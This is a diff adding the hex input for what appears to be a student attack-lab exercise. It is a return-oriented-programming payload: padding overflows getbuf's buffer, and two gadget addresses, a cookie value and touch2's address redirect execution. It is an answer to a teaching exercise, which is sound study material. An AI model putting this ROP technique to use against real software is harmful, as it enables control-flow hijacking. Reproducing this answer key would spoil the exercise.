@@ -1,0 +1,14 @@
+/* 40 bytes of padding for getbuf's buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Gadget 1: popq %rax ; ret   @ 0x405090 */
+90 50 40 00 00 00 00 00
+/* cookie (little-endian, 8 bytes) */
+78 43 27 2d 00 00 00 00
+/* Gadget 2: movq %rax,%rdi ; ret   @ 0x4050b8 */
+b8 50 40 00 00 00 00 00
+/* Address of touch2  */
+00 40 40 00 00 00 00 00
